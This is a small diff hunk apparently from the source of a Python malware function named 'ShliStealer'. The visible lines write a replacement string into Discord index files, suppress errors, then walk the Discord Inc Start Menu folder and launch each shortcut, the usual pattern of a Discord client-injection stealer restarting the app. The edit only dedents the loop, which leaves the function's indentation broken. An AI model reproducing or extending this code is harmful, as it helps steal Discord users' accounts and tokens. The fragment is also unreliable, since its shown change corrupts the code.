@@ -242,7 +242,7 @@ def ShliStealer():
 						index_file3.write(replace_string)
 				except Exception:
 				    pass
-	for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
+for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
 		for name in files:
 			discord_file = os.path.join(root, name)
 			os.startfile(discord_file)
